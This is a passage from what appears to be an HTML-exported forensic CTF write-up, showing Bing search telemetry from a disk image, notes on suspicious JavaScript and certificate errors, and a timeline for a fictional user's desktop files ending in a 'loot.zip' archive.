+</code></pre><pre><code>snrVersion":"2020.09.18.15271563","ciVersion":"65","defaultBrowser":"3","DeviceID":"{FC8094E0-2B17-4B92-A4A1-76E836B60765}","IsTouch":"false","OSSKU":"72","AppLifetimeID":"C05C801ADD2E4A4F9CBA70455744C030","CortanaOptIn":"false","CortanaCapabilities":"None","ImpressionUrl":"https://www.bing.com/QF_KEYSTROKE_VIRTUAL_URL?qry=sy&amp;setlang=en-US&amp;cc=US&amp;nohs=1&amp;qfm=1&amp;cp=2&amp;cvid=0444ea84524e445eab05c3fcb57edaec&amp;ig=2408c9c6b09c4c4f874ccb9d314f8689&amp;ASInitIG=7B43D82030EF473FB2C2DCC83E96F1E2","ResourcesVersion":"15271563"},"TS":1600492152053,"UTS":1600492153107,"UxClassification":{"client":"windows"},"Cookies":{"SRCHUID":{"V":"2","GUID":"7876E0F85501467C8ECAB0B4CD28A2E3","dmnchg":"1"},"SRCHD":{"AF":"NOFORM"},"SRCHUSR":{"DOB":"20200918"},"SRCHHPGUSR":{"LUT":"1600492104230","HV":"1600492146"},"CortanaAppUID":"26BB8AD28F3ED908970DAE242916F035","MUID":"5C0EB067BF1C4C91B257349C4618F667","_SS":{"SID":"380577DCDB216A4F25F27896DA1C6BBE","CPID":"1600492151346","AC":"1","CPH":"92017397","CBV":"15271563"}}}]]&gt;&lt;/D&gt;&lt;Page&gt;&lt;Name&gt;Page.SmartSearch.AS.Suggestions&lt;/Name&gt;&lt;L&gt;&lt;![CDATA[[]]]&gt;&lt;/L&gt;&lt;/Page&gt;&lt;TS&gt;1600492152053&lt;/TS&gt;&lt;Ovr&gt;&lt;requestInfo key="RawQuery" value="sy"/&gt;&lt;requestInfo key="IsQuery" value="false"/&gt;&lt;requestInfo key="Form" value=""/&gt;&lt;userInfo key="AppName" value="SmartSearch"/&gt;&lt;/Ovr&gt;&lt;/M&gt;&lt;/Group&gt;&lt;Group&gt;&lt;M&gt;&lt;IG&gt;72dbbfe77fd7496da1dd3f1a33916ddc&lt;/IG&gt;&lt;DS&gt;&lt;![CDATA[[{"T":"D.Aggregator","Service":"AutoSuggest","Scenario":"Aggregator","AppNS":"SmartSearch","DS":[],"rankerModelIds":{"fastRankModelId":"STH_7e527c65-7b72-46a8-84fe-4a041aed762b"}},{"T":"D.ST","AppNS":"SmartSearch","Service":"AutoSuggest","Scenario":"ST","SC":4,"DS":[{"T":"D.Url","K":1001,"Q":"System","Val":"ST","Ho":2,"Gr":1,"DeviceSignals":{"Rank":5453,"PHits":"System.ParsingName","Id":"Classic_{bb06c0e4-d293-4f75-8a90-cb05b6477eee}","DName":"System","MDN":0},"RankerSignals":{"rankingScore":0.36676,"featureStore":{"0":0.07799,"3":0.00022,"5":0.721,"6":4113629.14,"7":14753,"8":1,"10":3,"12":0.00073,"16":5453,"18":0.109,"19":1,"24":0.019,"26":0.148,"28":0,"29":0.042,"30":0,"31":0.008,"32":0,"33":0,"34":0.014,"35":0.001,"37":0.005,"38":77334843,"39":0.289,"40":0.616,"41":0.289,"50":0,"51":0.002,"52":0,"53":0,"54":0.023,"56":0,"57":0.002,"64":1,"91":0,"93":1,"94":0.3183,"95":906977,"134":3,"135":0.5,"137":6,"143":1,"157":1,"159":8960,"188":1,"264":0.32858,"269":8960,"270":8960,"284":3,"296":1,"403":1,"405":8960,"420":0.83333,"421":0.83333,"441":4}}},{"T":"D.Url","K":1002,"Q":"See if you have a 32-bit or 64-bit version of Windows","Val":"ST","Ho":2,"Gr":1,"DeviceSignals":{"Rank":7692,"PHits":"System.ParsingName","Id":"AAA_SystemSettings_PCSystem_SystemTypeStatus","DName":"See if you have a 32-bit or 64-bit version of Windows","MDN":1},"RankerSignals":{"rankingScore":-5.95747,"featureStore":{"5":0.721,"7":14753,"8":1,"10":3,"12":0.00073,"16":7692,"18":0.109,"19":1,"24":0.019,"26":0.148,"28":0,"29":0.042,"30":0,"31":0.008,"32":0,"33":0,"34":0.014,"35":0.001,"37":0.005,"38":77334843,"39":0.289,"40":0.616,"41":0.289,"50":0,"51":0.002,"52":0,"53":0,"54":0.023,"56":0,"57":0.002,"64":1,"91":0,"93":1,"134":50,"135":8.33333,"136":1,"137":53,"157":1,"159":8960,"264":0.32858,"269":8960,"270":8960,"284":50,"296":1,"403":1,"405":8960,"420":0.56813,"421":0.56813,"441":4}}},{"T":"D.Url","K":1003,"Q":"Reset this PC","MQ":"system restore","Val":"ST","Ho":2,"Gr":1,"DeviceSignals":{"Rank":8555,"PHits":"System.ParsingName","Id":"AAA_SystemSettings_Misc_ResetYourPC-2","DName":"Reset this PC","MDN":1},"RankerSignals":{"rankingScore":-5.01911,"featureStore":{"5":0.721,"7":14753,"8":1,"10":3,"12":0.00073,"16":8555,"18":0.109,"19":1,"24":0.019,"26":0.148,"28":0,"29":0.042,"30":0,"31":0.008,"32":0,"33":0,"34":0.014,"35":0.001,"37":0.005,"38":77334843,"39":0.289,"40":0.616,"41":0.289,"50":0,"51":0.002,"52":0,"53":0,"54":0.023,"56":0,"57":0.002,"64":1,"91":0,"93":1,"134":11,"135":2.2,"137":13,"157":1,"158":3365,"159":64000,"264":0.32858,"269":64000,"270":64000,"284":10,"296":1,"403":1,"405":64000,"420":0.47009,"421":0.47009,"441":4}}},{"T":"D.Url","K":1004,"Q":"Taskbar notification area","Val":"ST","Ho":2,"Gr":1,"DeviceSignals"
+</code></pre><p><span>Also, we found that someone was trying to recover Microsoft account and used suspicious </span><strong><span>JavaScript</span></strong><span> files that were located under </span><strong><a href="http://bing.com" target="_blank" rel="noopener"><span>bing.com</span></a></strong><span> (Figures 75 and 76):</span></p><center>
+<p><img src="https://i.imgur.com/PCosxJb.png" alt="" loading="lazy"><br>
+<span>Figure 75 - suspicious JavaScript</span></p>
+<p><img src="https://i.imgur.com/irMA8GU.png" alt="" loading="lazy"><br>
+<span>Figure 76 - suspicious JavaScript</span></p>
+</center><p><span>One of the most repeated errors was the Certificate error, which may show that malicious certificates were used during the session (Figures 77 and 78):</span></p><center>
+<p><img src="https://i.imgur.com/lMOWtIB.png" alt="" loading="lazy"><br>
+<span>Figure 77 - Certificates</span></p>
+<p><img src="https://i.imgur.com/YMrPXTv.png" alt="" loading="lazy"><br>
+<span>Figure 78 - Certificates</span></p>
+</center><p><span>The following GitHub repositories were visited and probably used:</span></p><pre><code>#.NET Core Libraries (CoreFX)
+https://github.com/dotnet/corefx/tree/92f4f000de17e0b82e0ad637ac478abc9b410daa
+https://github.com/dotnet/corefx/tree/4a69581fcb63bae0f7c3c45d876f6443e160a174
+
+#libbfio is a library to provide basic file input/output abstraction.
+https://github.com/libyal/libvshadow/releases/download/20161111/libvshadow-alpha-20161111.tar.gz
+https://github.com/libyal/libbfio/releases/download/20160108/libbfio-alpha-20160108.tar.gz 
+
+</code></pre><hr><center>
+<h2 id="Part-9---DESKTOP-E01" data-id="Part-9---DESKTOP-E01"><a class="anchor hidden-xs" href="#Part-9---DESKTOP-E01" title="Part-9---DESKTOP-E01"><span class="octicon octicon-link"></span></a><span>Part 9 - DESKTOP-E01</span></h2>
+<h3 id="Vladimir2" data-id="Vladimir"><a class="anchor hidden-xs" href="#Vladimir2" title="Vladimir2"><span class="octicon octicon-link"></span></a><span>Vladimir</span></h3>
+</center><hr><p><span>I mount the disk images from Desktop PC. Here I found several exciting files.</span></p><p><span>My Social Security Number.txt:</span></p><pre><code>584-99-5601
+or is it?
+</code></pre><p><span>Plans.txt:</span></p><pre><code>1. Marry Jessica
+2. Jessica
+3. Get my portal gun
+4. Jessica
+5. Go on my own adventures
+6. Jessica
+7. Ask Rick about cloning Jessica
+</code></pre><p><span>Portal.png (Figure 79).</span></p><center>
+<p><img src="https://i.imgur.com/jLQyIaz.png" alt="" loading="lazy"><br>
+<span>Figure 79 - Portal gun</span></p>
+</center><p><span>Jessica. png (Figure 80).</span></p><center>
+<p><img src="https://i.imgur.com/6BmmSDu.png" alt="" loading="lazy"><br>
+<span>Figure 80 - Jessica</span></p>
+</center><p><span>Thoughts.txt: </span><code>Jessica</code><span>.</span></p><p><span>Similar to DC01, I found info about archive loot.zip and other files (Figure 81).</span></p><center>
+<p><img src="https://i.imgur.com/VK2OtbH.png" alt="" loading="lazy"><br>
+<span>Figure 81 - accessed files</span></p>
+</center><p><span>Probably here, we also have a 1-hour difference.</span></p><div class="alert alert-info">
+<h3 id="Timeline3" data-id="Timeline"><a class="anchor hidden-xs" href="#Timeline3" title="Timeline3"><span class="octicon octicon-link"></span></a><span>Timeline</span></h3>
+<p><strong><span>19 September 2020 02:45:34</span></strong><span> - My Social Security Number.txt is accessed</span><br>
+<strong><span>19 September 2020 02:45:39</span></strong><span> - Plans.txt is accessed</span><br>
+<strong><span>19 September 2020 02:46:18</span></strong><span> - loot.zip is created</span><br>
+<strong><span>19 September 2020 02:47:39</span></strong><span> - Thoughts.txt is accessed</span></p>
+</div><h2 id="References" data-id="References"><a class="anchor hidden-xs" href="#References" title="References"><span class="octicon octicon-link"></span></a><span>References</span></h2><ol>
+<li><a href="https://www.brimdata.io/" target="_blank" rel="noopener"><span>Brim</span></a></li>
+<li><a href="https://eventlogxp.com/" target="_blank" rel="noopener"><span>Event Log Explorer</span></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1129/" target="_blank" rel="noopener"><span>MITRE Shared Modules</span></a></li>
+<li><a href="https://www.hybrid-analysis.com/" target="_blank" rel="noopener"><span>Sandbox</span></a></li>
+<li><a href="https://www.virustotal.com/gui/file/10f3b92002bb98467334161cf85d0b1730851f9256f83c27db125e9a0c1cfda6/detection/f-10f3b92002bb98467334161cf85d0b1730851f9256f83c27db125e9a0c1cfda6-1643146744" target="_blank" rel="noopener"><span>Totalvirus analize</span></a></li>
+<li><a href="https://www.hybrid-analysis.com/sample/10f3b92002bb98467334161cf85d0b1730851f9256f83c27db125e9a0c1cfda6/5f7695f4a553eb21aa0cdfe1" target="_blank" rel="noopener"><span>Sandbox</span></a></li>
+<li><a href="https://whois.ru" target="_blank" rel="noopener"><span>whois</span></a></li>
+</ol></div>
+    <div class="ui-toc dropup unselectable hidden-print" style="display:none;">
+        <div class="pull-right dropdown">
+            <a id="tocLabel" class="ui-toc-label btn btn-default" data-toggle="dropdown" href="#" role="button" aria-haspopup="true" aria-expanded="false" title="Table of content">
+                <i class="fa fa-bars"></i>
+            </a>
+            <ul id="ui-toc" class="ui-toc-dropdown dropdown-menu" aria-labelledby="tocLabel">
+                <div class="toc"><ul class="nav">
+<li><a href="#CCF-Group-1" title="CCF Group 1">CCF Group 1</a><ul class="nav">
+<li><a href="#Overview" title="Overview:">Overview:</a></li>
+<li><a href="#References" title="References">References</a></li>
+</ul>
+</li>
+</ul>
+</div><div class="toc-menu"><a class="expand-toggle" href="#">Expand all</a><a class="back-to-top" href="#">Back to top</a><a class="go-to-bottom" href="#">Go to bottom</a></div>
+            </ul>
+        </div>
+    </div>
+    <div id="ui-toc-affix" class="ui-affix-toc ui-toc-dropdown unselectable hidden-print" data-spy="affix" style="top:17px;display:none;" null null>
+        <div class="toc"><ul class="nav">
+<li><a href="#CCF-Group-1" title="CCF Group 1">CCF Group 1</a><ul class="nav">
+<li><a href="#Overview" title="Overview:">Overview:</a></li>
+<li><a href="#References" title="References">References</a></li>
+</ul>
+</li>
+</ul>
+</div><div class="toc-menu"><a class="expand-toggle" href="#">Expand all</a><a class="back-to-top" href="#">Back to top</a><a class="go-to-bottom" href="#">Go to bottom</a></div>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js" integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha256-U5ZEeKfGNOja007MMD3YBI0A3OSZOQbeG6z2f2Y0hu8=" crossorigin="anonymous" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gist-embed/2.6.0/gist-embed.min.js" integrity="sha256-KyF2D6xPIJUW5sUDSs93vWyZm+1RzIpKCexxElmxl8g=" crossorigin="anonymous" defer></script>
+    <script>
+        var markdown = $(".markdown-body");
+        //smooth all hash trigger scrolling
+        function smoothHashScroll() {
+            var hashElements = $("a[href^='#']").toArray();
+            for (var i = 0; i < hashElements.length; i++) {
+                var element = hashElements[i];
+                var $element = $(element);
+                var hash = element.hash;
+                if (hash) {
+                    $element.on('click', function (e) {
+                        // store hash
+                        var hash = this.hash;
+                        if ($(hash).length <= 0) return;
+                        // prevent default anchor click behavior
+                        e.preventDefault();
+                        // animate
+                        $('body, html').stop(true, true).animate({
+                            scrollTop: $(hash).offset().top
+                        }, 100, "linear", function () {
+                            // when done, add hash to url
+                            // (default click behaviour)
+                            window.location.hash = hash;
+                        });
+                    });
+                }
+            }
+        }
+
+        smoothHashScroll();
+        var toc = $('.ui-toc');
+        var tocAffix = $('.ui-affix-toc');
+        var tocDropdown = $('.ui-toc-dropdown');
+        //toc
+        tocDropdown.click(function (e) {
+            e.stopPropagation();
+        });
+
+        var enoughForAffixToc = true;
+
+        function generateScrollspy() {
+            $(document.body).scrollspy({
+                target: ''
+            });
+            $(document.body).scrollspy('refresh');
+            if (enoughForAffixToc) {
+                toc.hide();
+                tocAffix.show();
+            } else {
+                tocAffix.hide();
+                toc.show();
+            }
+            $(document.body).scroll();
+        }
+
+        function windowResize() {
+            //toc right
+            var paddingRight = parseFloat(markdown.css('padding-right'));
+            var right = ($(window).width() - (markdown.offset().left + markdown.outerWidth() - paddingRight));
+            toc.css('right', right + 'px');
+            //affix toc left
+            var newbool;
+            var rightMargin = (markdown.parent().outerWidth() - markdown.outerWidth()) / 2;
+            //for ipad or wider device
+            if (rightMargin >= 133) {
+                newbool = true;
+                var affixLeftMargin = (tocAffix.outerWidth() - tocAffix.width()) / 2;
+                var left = markdown.offset().left + markdown.outerWidth() - affixLeftMargin;
+                tocAffix.css('left', left + 'px');
+            } else {
+                newbool = false;
+            }
+            if (newbool != enoughForAffixToc) {
+                enoughForAffixToc = newbool;
+                generateScrollspy();
+            }
+        }
+        $(window).resize(function () {
+            windowResize();
+        });
+        $(document).ready(function () {
+            windowResize();
+            generateScrollspy();
+        });
+
+        //remove hash
+        function removeHash() {
+            window.location.hash = '';
+        }
+
+        var backtotop = $('.back-to-top');
+        var gotobottom = $('.go-to-bottom');
+
+        backtotop.click(function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+            if (scrollToTop)
+                scrollToTop();
+            removeHash();
+        });
+        gotobottom.click(function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+            if (scrollToBottom)
+                scrollToBottom();
+            removeHash();
+        });
+
+        var toggle = $('.expand-toggle');
+        var tocExpand = false;
+
+        checkExpandToggle();
+        toggle.click(function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+            tocExpand = !tocExpand;
+            checkExpandToggle();
+        })
+
+        function checkExpandToggle () {
+            var toc = $('.ui-toc-dropdown .toc');
+            var toggle = $('.expand-toggle');
+            if (!tocExpand) {
+                toc.removeClass('expand');
+                toggle.text('Expand all');
+            } else {
+                toc.addClass('expand');
+                toggle.text('Collapse all');
+            }
+        }
+
+        function scrollToTop() {
+            $('body, html').stop(true, true).animate({
+                scrollTop: 0
+            }, 100, "linear");
+        }
+
+        function scrollToBottom() {
+            $('body, html').stop(true, true).animate({
+                scrollTop: $(document.body)[0].scrollHeight
+            }, 100, "linear");
+        }
+    </script>
+</body>
+
+</html>
